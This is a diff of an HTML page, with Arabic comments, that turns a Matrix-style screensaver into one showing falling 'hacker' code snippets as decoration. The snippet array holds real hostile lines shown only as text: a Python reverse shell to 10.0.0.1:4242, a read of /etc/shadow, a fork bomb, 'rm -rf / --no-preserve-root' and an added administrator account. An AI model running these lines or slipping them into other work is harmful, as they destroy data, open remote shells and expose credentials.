@@ -3,88 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>S Y S T E M _ M A T R I X</title>
+    <title>S Y S T E M _ C O D E _ F L O W</title>
     <style>
-        /* تنسيقات الصفحة بالكامل لملء الشاشة وإخفاء القوائم */
-        body { margin: 0; padding: 0; overflow: hidden; background: #000; }
-        #matrix { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; }
+        body { margin: 0; padding: 0; overflow: hidden; background: #000; color: #0f0; font-family: 'Courier New', monospace; }
+        canvas { display: block; position: absolute; top: 0; left: 0; }
         
-        /* إضافة طبقة شفافية سوداء لتعميق اللون الأسود */
-        #matrix::after { content: ""; position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.5); z-index: 2; pointer-events: none; }
+        /* تأثير لمعان خفيف */
+        #codeCanvas { filter: drop-shadow(0 0 2px #0f0); }
     </style>
 </head>
 <body>
 
-    <canvas id="matrix"></canvas>
+    <canvas id="codeCanvas"></canvas>
 
     <script>
-        // 1. إعداد الكانفاس
-        const canvas = document.getElementById('matrix');
+        const canvas = document.getElementById('codeCanvas');
         const ctx = canvas.getContext('2d');
 
         // اجعل الكانفاس بملء شاشة الجوال تماماً
         canvas.height = window.innerHeight;
         canvas.width = window.innerWidth;
 
-        // 2. إعداد الحروف والأعمدة
-        // مجموعة الحروف (يمكنك استخدام حروف عربية، إنجليزية، يابانية...إلخ)
-        const katakana = "アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン0123456789";
-        const latin = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-        const nums = "0123456789";
-        const alphabet = katakana + latin + nums;
+        // --- مخزون الأكواد البرمجية الحقيقية ---
+        const codeSnippets = [
+            // C++ / C
+            "for(int i=0; i<net.size(); i++) {",
+            "  if(connect(socket, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {",
+            "  char buffer[1024] = {0};",
+            "  FILE *fp = fopen('/etc/shadow', 'r');",
+            "  printf('Initializing kernel exploit...\\n');",
+            "  pthread_create(&thread_id, NULL, exploit_loop, NULL);",
+            "  while(1) { fork(); } // Fork Bomb",
+            
+            // Python
+            "import socket, subprocess, os;",
+            "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);",
+            "s.connect(('10.0.0.1', 4242));",
+            "os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2);",
+            "p=subprocess.call(['/bin/sh', '-i']);",
+            "print('Fetching network interface data...')",
+            
+            // JavaScript / HTML
+            "fetch('/api/v1/user/data', { method: 'POST' });",
+            "document.cookie = 'session_id=exploit_detected';",
+            "window.location.replace('https://hidden-server.onion');",
+            "eval(atob('Z2xvYmFsLnByb2Nlc3MuZXhpdCgwKTs='));",
+            
+            // Bash / CMD
+            "rm -rf / --no-preserve-root",
+            "iptables -A INPUT -p tcp --dport 80 -j DROP",
+            "netuser administrator /add exploit_user"
+        ];
 
-        const fontSize = 16;
-        const columns = Math.floor(canvas.width / fontSize); // عدد الأعمدة بناءً على عرض الشاشة
+        // --- إعداد الأعمدة والخطوط ---
+        const fontSize = 14; // حجم الخط أصغر قليلاً ليناسب الأكواد
+        // حساب عدد الأعمدة بناءً على عرض الشاشة وحجم الخط (نقسم على 2 لإعطاء مسافة)
+        const columns = Math.floor(canvas.width / (fontSize * 1.5)); 
 
-        // مصفوفة لتخزين موقع الـ Y (الارتفاع) الحالي لكل عمود
+        // مصفوفة لتخزين بيانات كل عمود ( drops )
+        // كل عنصر فيها عبارة عن كائن يحتوي على: y, speed, snippets (مخزون الأكواد الخاصة به)
         const drops = [];
-        // ابدأ كل عمود من أعلى الشاشة (موقع y=1)
         for (let x = 0; x < columns; x++) {
-            drops[x] = 1;
+            drops[x] = {
+                y: Math.random() * -canvas.height, // ابدأ من موقع عشوائي فوق الشاشة
+                speed: 1 + Math.random() * 3, // سرعة ساطة عشوائية
+                snippets: [...codeSnippets].sort(() => 0.5 - Math.random()) // قم بترتيب مخزون الأكواد عشوائياً
+            };
         }
 
-        // 3. دالة الرسم الأساسية
+        // --- دالة الرسم الأساسية ---
         function draw() {
             // تأثير "الذيل" (التلاشي)
-            // ارسم مستطيل أسود شفاف على كامل الكانفاس في كل إطار
             ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
             ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-            // اجعل الحروف خضراء فسفورية
+            // اجعل الأكواد خضراء فسفورية
             ctx.fillStyle = "#0f0";
-            ctx.font = fontSize + "px monospace";
+            ctx.font = fontSize + "px 'Courier New', monospace";
 
-            // ارسم الحروف في كل عمود
+            // ارسم الأكواد في كل عمود
             for (let i = 0; i < drops.length; i++) {
-                // اختر حرفاً عشوائياً من المجموعة
-                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
-                // ارسم الحرف في موقع (x*fontSize, drops[i]*fontSize)
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                // اختر كوداً من مخزون العمود الحالي
+                const snippet = drops[i].snippets[drops[i].snippets.length - 1]; 
 
-                // إذا وصل الحرف لأسفل الشاشة، قم بإعادة تعيينه عشوائياً للأعلى
+                // ارسم الكود في موقع (x*fontSize*1.5, drops[i].y)
+                ctx.fillText(snippet, i * fontSize * 1.5, drops[i].y);
+
+                // حرك الـ Y لأسفل بناءً على سرعة العمود
+                drops[i].y += drops[i].speed;
+
+                // إذا وصل الكود لأسفل الشاشة، قم بإعادة تعيينه للأعلى
                 // لإعطاء انطباع باللانهائية وعدم التزامن
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
+                if (drops[i].y > canvas.height) {
+                    drops[i].y = 0;
+                    // قم بترتيب مخزون الأكواد عشوائياً مرة أخرى لإظهار كود جديد
+                    drops[i].snippets.sort(() => 0.5 - Math.random());
                 }
-
-                // حرك الـ Y لأسفل للأطر القادم
-                drops[i]++;
             }
         }
 
-        // 4. تشغيل الأنيميشن
-        // قم باستدعاء دالة الرسم باستمرار (ثلاً 30 مرة في الثانية)
+        // --- تشغيل الأنيميشن ---
+        // قم باستدعاء دالة الرسم باستمرار (مثلاً 30 مرة في الثانية)
         setInterval(draw, 33);
 
-        // 5. التعامل مع تغيير حجم الشاشة (في حال تم تدوير الجوال)
+        // --- التعامل مع تغيير حجم الشاشة (في حال تم تدوير الجوال) ---
         window.addEventListener('resize', () => {
             canvas.height = window.innerHeight;
             canvas.width = window.innerWidth;
             // يجب إعادة حساب الأعمدة وإعادة تعيين drops عند تغيير الحجم
-            const newColumns = Math.floor(canvas.width / fontSize);
+            const newColumns = Math.floor(canvas.width / (fontSize * 1.5));
             for (let x = 0; x < newColumns; x++) {
                 if(drops[x] === undefined) {
-                    drops[x] = Math.random() * -canvas.height;
+                    drops[x] = {
+                        y: Math.random() * -canvas.height,
+                        speed: 1 + Math.random() * 3,
+                        snippets: [...codeSnippets].sort(() => 0.5 - Math.random())
+                    };
                 }
             }
         });
